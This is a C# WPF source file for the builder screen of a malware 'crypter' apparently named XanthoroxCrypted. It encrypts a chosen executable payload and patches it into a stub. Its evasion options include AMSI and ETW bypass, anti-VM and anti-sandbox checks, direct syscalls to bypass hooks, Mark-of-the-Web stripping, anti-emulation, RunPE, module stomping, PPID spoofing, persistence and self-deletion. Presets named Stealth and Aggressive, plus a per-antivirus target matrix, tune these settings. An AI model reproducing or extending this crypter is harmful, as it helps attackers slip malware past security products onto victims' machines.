using Microsoft.Win32;
using System;
using System.IO;
using System.Threading.Tasks;
using System.Windows;
using System.Windows.Controls;
using System.Windows.Media;
using XanthoroxCrypted.Core;

namespace XanthoroxCrypted.Views
{
    public partial class BuilderView : UserControl
    {
        private bool _suppressPresetChange = false;

        public BuilderView()
        {
            InitializeComponent();
        }

        private void BtnBrowse_Click(object sender, RoutedEventArgs e)
        {
            OpenFileDialog openFileDialog = new OpenFileDialog();
            openFileDialog.Filter = "Executables (*.exe)|*.exe|All files (*.*)|*.*";
            if (openFileDialog.ShowDialog() == true)
                TxtFilePath.Text = openFileDialog.FileName;
        }

        // ═══ PRESET AUTO-CONFIGURATION ═══
        private void CmbPreset_Changed(object sender, SelectionChangedEventArgs e)
        {
            if (_suppressPresetChange || CmbPreset.SelectedIndex < 0) return;
            if (ChkAntiDebug == null) return; // Not yet loaded

            switch (CmbPreset.SelectedIndex)
            {
                case 0: // Custom — do nothing
                    break;

                case 1: // Stealth — low footprint, fast, minimal detection
                    SetAll(false);
                    ChkFibers.IsChecked = true;
                    ChkAMSI.IsChecked = true;
                    ChkETW.IsChecked = true;
                    ChkMelt.IsChecked = true;
                    ChkFakeError.IsChecked = true;
                    ChkSleepObf.IsChecked = true;
                    ChkEntropyNorm.IsChecked = true;
                    ChkMotwStrip.IsChecked = true;       // L21: Strip download warning
                    ChkAntiEmulation.IsChecked = true;   // L22: Defeat AV emulators
                    ChkSectionMerge.IsChecked = true;    // L33: Fool ML classifiers
                    break;

                case 2: // Aggressive — maximum evasion, all layers active
                    SetAll(true);
                    // Inflate stays OFF in SetAll — user must opt-in to 80MB file
                    break;

                case 3: // Balanced — strong without overkill
                    SetAll(false);
                    ChkAntiDebug.IsChecked = true;
                    ChkAntiVM.IsChecked = true;
                    ChkFibers.IsChecked = true;
                    ChkAMSI.IsChecked = true;
                    ChkETW.IsChecked = true;
                    ChkPPIDSpoof.IsChecked = true;
                    ChkSleepObf.IsChecked = true;
                    ChkEntropyNorm.IsChecked = true;
                    ChkSyscalls.IsChecked = true;        // L11: Bypass userland hooks
                    ChkMotwStrip.IsChecked = true;       // L21: Strip MOTW
                    ChkAntiEmulation.IsChecked = true;   // L22: Anti-emulator
                    ChkStagedLoad.IsChecked = true;      // L39: Staged decrypt
                    ChkSectionMerge.IsChecked = true;    // L33: Single-section PE
                    break;
            }
        }

        private void SetAll(bool state)
        {
            ChkAntiDebug.IsChecked = state;
            ChkAntiVM.IsChecked = state;
            ChkAntiSandbox.IsChecked = state;
            ChkAMSI.IsChecked = state;
            ChkETW.IsChecked = state;
            ChkSleepObf.IsChecked = state;
            ChkPPIDSpoof.IsChecked = state;
            ChkEntropyNorm.IsChecked = state;
            ChkFibers.IsChecked = state;
            ChkRunPE.IsChecked = state;
            ChkModuleStomp.IsChecked = state;
            ChkPersist.IsChecked = state;
            ChkMelt.IsChecked = state;
            ChkFakeError.IsChecked = state;
            // New L11-L16 toggles
            ChkSyscalls.IsChecked = state;
            ChkThreadPool.IsChecked = state;
            ChkGuardPage.IsChecked = state;
            ChkHWIDBind.IsChecked = state;
            ChkPhantomDLL.IsChecked = state;
            ChkCallbackDiv.IsChecked = state;
            // New L21-L40 toggles
            ChkMotwStrip.IsChecked = state;
            ChkAntiEmulation.IsChecked = state;
            ChkStagedLoad.IsChecked = state;
            ChkInflate.IsChecked = false; // Inflate defaults OFF (80MB is large)
            ChkSectionMerge.IsChecked = state;
            ChkOverlayMode.IsChecked = state;
        }

        // ═══ BUILD PIPELINE ═══
        private async void BtnBuild_Click(object sender, RoutedEventArgs e)
        {
            string payloadPath = TxtFilePath.Text.Trim();
            string outputName = TxtOutputName.Text.Trim();

            if (string.IsNullOrEmpty(payloadPath) || !File.Exists(payloadPath))
            {
                SetStatus("No payload selected.", Brushes.OrangeRed);
                return;
            }

            if (string.IsNullOrEmpty(outputName))
                outputName = "Crypted.exe";

            SetStatus("Building...", new SolidColorBrush(Color.FromRgb(0, 212, 255)));

            string validationWarnings = "";

            string result = await Task.Run(() =>
            {
                try
                {
                    // Read payload
                    byte[] payloadBytes = File.ReadAllBytes(payloadPath);

                    // Get cipher selection
                    int cipherIndex = 3; // Default XOR
                    Dispatcher.Invoke(() =>
                    {
                        if (CmbEncryption != null && CmbEncryption.SelectedIndex >= 0)
                            cipherIndex = CmbEncryption.SelectedIndex;
                    });

                    // Generate random key
                    byte[] key = CryptoEngine.GenerateKey(32);

                    // Check research package selection
                    byte researchPkg = 0;
                    Dispatcher.Invoke(() =>
                    {
                        var mainWin = Window.GetWindow(this) as MainWindow;
                        if (mainWin?.ViewResearch != null)
                            researchPkg = (byte)mainWin.ViewResearch.GetSelectedPackage();
                    });

                    byte[] encrypted;
                    byte[]? researchParams = null;

                    if (researchPkg == 1)
                    {
                        // Ghost Protocol
                        var (enc, gp) = GhostProtocol.Encrypt(payloadBytes, key);
                        encrypted = enc;
                        researchParams = GhostProtocol.SerializeParams(gp);
                    }
                    else if (researchPkg == 2)
                    {
                        // Neuromancer
                        var (enc, np) = Neuromancer.Encrypt(payloadBytes, key);
                        encrypted = enc;
                        researchParams = Neuromancer.SerializeParams(np);
                    }
                    else if (researchPkg == 3)
                    {
                        // Darknet Cipher
                        var (enc, dp) = DarknetCipher.Encrypt(payloadBytes, key);
                        encrypted = enc;
                        researchParams = DarknetCipher.SerializeParams(dp);
                    }
                    else if (researchPkg == 4)
                    {
                        // Void Walker
                        var (enc, vp) = VoidWalker.Encrypt(payloadBytes, key);
                        encrypted = enc;
                        researchParams = VoidWalker.SerializeParams(vp);
                    }
                    else
                    {
                        // Standard cipher
                        CipherType cipher = (CipherType)cipherIndex;
                        encrypted = CryptoEngine.Encrypt(payloadBytes, key, cipher);
                    }

                    // Entropy normalization (optional)
                    bool doEntropy = false;
                    Dispatcher.Invoke(() => doEntropy = ChkEntropyNorm.IsChecked == true);
                    if (doEntropy)
                        encrypted = EntropyNorm.Encode(encrypted);

                    // Build config
                    BuildConfig config = new BuildConfig();
                    Dispatcher.Invoke(() =>
                    {
                        config.AntiDebug   = ChkAntiDebug.IsChecked == true;
                        config.AntiVM      = ChkAntiVM.IsChecked == true;
                        config.AntiSandbox = ChkAntiSandbox.IsChecked == true;
                        config.AMSI        = ChkAMSI.IsChecked == true;
                        config.ETW         = ChkETW.IsChecked == true;
                        config.Fibers      = ChkFibers.IsChecked == true;
                        config.RunPE       = ChkRunPE.IsChecked == true;
                        config.ModuleStomp = ChkModuleStomp.IsChecked == true;
                        config.Persist     = ChkPersist.IsChecked == true;
                        config.Melt        = ChkMelt.IsChecked == true;
                        config.FakeError   = ChkFakeError.IsChecked == true;
                        config.SleepObf    = ChkSleepObf.IsChecked == true;
                        config.PPIDSpoof   = ChkPPIDSpoof.IsChecked == true;
                        config.EntropyNorm = doEntropy;
                        // L11-L16 toggles
                        config.Syscalls    = ChkSyscalls.IsChecked == true;
                        config.ThreadPool  = ChkThreadPool.IsChecked == true;
                        config.GuardPage   = ChkGuardPage.IsChecked == true;
                        config.HWIDBind    = ChkHWIDBind.IsChecked == true;
                        config.PhantomDLL  = ChkPhantomDLL.IsChecked == true;
                        config.CallbackDiv = ChkCallbackDiv.IsChecked == true;
                        // L21-L40 toggles
                        config.MotwStrip      = ChkMotwStrip.IsChecked == true;
                        config.AntiEmulation  = ChkAntiEmulation.IsChecked == true;
                        config.StagedLoad     = ChkStagedLoad.IsChecked == true;
                        config.Inflate        = ChkInflate.IsChecked == true;
                        config.SectionMerge   = ChkSectionMerge.IsChecked == true;
                        config.OverlayMode    = ChkOverlayMode.IsChecked == true;
                        config.EncAlgorithm = (byte)cipherIndex;
                        config.ResearchPackage = researchPkg;
                    });

                    // ══ VALIDATE & AUTO-FIX CONFLICTS ══
                    var validation = ConfigValidator.ValidateAndFix(config);
                    if (!validation.IsValid)
                        return "ERR: " + string.Join(" | ", validation.Errors);
                    if (validation.Warnings.Count > 0)
                        validationWarnings = string.Join(" | ", validation.Warnings);

                    // Sync auto-fixed config back to UI checkboxes
                    if (validation.AutoFixed)
                    {
                        Dispatcher.Invoke(() =>
                        {
                            ChkFibers.IsChecked      = config.Fibers;
                            ChkRunPE.IsChecked       = config.RunPE;
                            ChkModuleStomp.IsChecked = config.ModuleStomp;
                            ChkPhantomDLL.IsChecked  = config.PhantomDLL;
                            ChkThreadPool.IsChecked  = config.ThreadPool;
                            ChkCallbackDiv.IsChecked = config.CallbackDiv;
                            ChkPersist.IsChecked     = config.Persist;
                            ChkMelt.IsChecked        = config.Melt;
                        });
                    }

                    // Patch stub
                    string appDir = AppDomain.CurrentDomain.BaseDirectory;
                    string stubPath = Path.Combine(appDir, "..", "Stub", "Stub.exe");
                    if (!File.Exists(stubPath))
                        stubPath = Path.Combine(appDir, "Stub.exe");

                    string outputDir = Path.Combine(appDir, "..", "Output");
                    string outputPath = Path.Combine(outputDir, outputName);

                    string err = StubPatcher.Build(stubPath, outputPath, encrypted, key, config, researchParams);
                    if (!string.IsNullOrEmpty(err))
                        return "ERR: " + err;

                    return outputPath;
                }
                catch (Exception ex)
                {
                    return "ERR: " + ex.Message;
                }
            });

            if (result.StartsWith("ERR:"))
            {
                SetStatus(result.Substring(5), Brushes.OrangeRed);
            }
            else
            {
                string statusMsg = "Built → " + Path.GetFileName(result);
                if (!string.IsNullOrEmpty(validationWarnings))
                    statusMsg += "  ⚠ " + validationWarnings;
                SetStatus(statusMsg, string.IsNullOrEmpty(validationWarnings)
                    ? new SolidColorBrush(Color.FromRgb(63, 185, 80))    // Green = clean
                    : new SolidColorBrush(Color.FromRgb(255, 193, 7)));  // Amber = warnings
            }
        }

        private void SetStatus(string text, Brush color)
        {
            LblStatus.Text = text;
            LblStatus.Foreground = color;
        }

        /// <summary>
        /// Called by TargetView when user clicks "Apply to Builder".
        /// Sets all toggles to match the computed BuildConfig from the AV Target Matrix.
        /// </summary>
        public void ApplyFromTargetMatrix(BuildConfig config)
        {
            _suppressPresetChange = true;

            // Set preset to Custom
            CmbPreset.SelectedIndex = 0;

            // Anti-analysis
            ChkAntiDebug.IsChecked   = config.AntiDebug;
            ChkAntiVM.IsChecked      = config.AntiVM;
            ChkAntiSandbox.IsChecked = config.AntiSandbox;

            // Telemetry
            ChkAMSI.IsChecked = config.AMSI;
            ChkETW.IsChecked  = config.ETW;

            // Execution
            ChkFibers.IsChecked      = config.Fibers;
            ChkRunPE.IsChecked       = config.RunPE;
            ChkModuleStomp.IsChecked = config.ModuleStomp;

            // Post-execution
            ChkPersist.IsChecked   = config.Persist;
            ChkMelt.IsChecked      = config.Melt;
            ChkFakeError.IsChecked = config.FakeError;

            // Advanced evasion
            ChkSleepObf.IsChecked    = config.SleepObf;
            ChkPPIDSpoof.IsChecked   = config.PPIDSpoof;
            ChkEntropyNorm.IsChecked = config.EntropyNorm;

            // New L11-L16 toggles
            ChkSyscalls.IsChecked    = config.Syscalls;
            ChkThreadPool.IsChecked  = config.ThreadPool;
            ChkGuardPage.IsChecked   = config.GuardPage;
            ChkHWIDBind.IsChecked    = config.HWIDBind;
            ChkPhantomDLL.IsChecked  = config.PhantomDLL;
            ChkCallbackDiv.IsChecked = config.CallbackDiv;

            // New L21-L40 toggles
            ChkMotwStrip.IsChecked     = config.MotwStrip;
            ChkAntiEmulation.IsChecked = config.AntiEmulation;
            ChkStagedLoad.IsChecked    = config.StagedLoad;
            ChkInflate.IsChecked       = config.Inflate;
            ChkSectionMerge.IsChecked  = config.SectionMerge;
            ChkOverlayMode.IsChecked   = config.OverlayMode;

            _suppressPresetChange = false;

            SetStatus("⚡ Target Matrix config applied.", new SolidColorBrush(Color.FromRgb(0, 229, 255)));
        }
    }
}
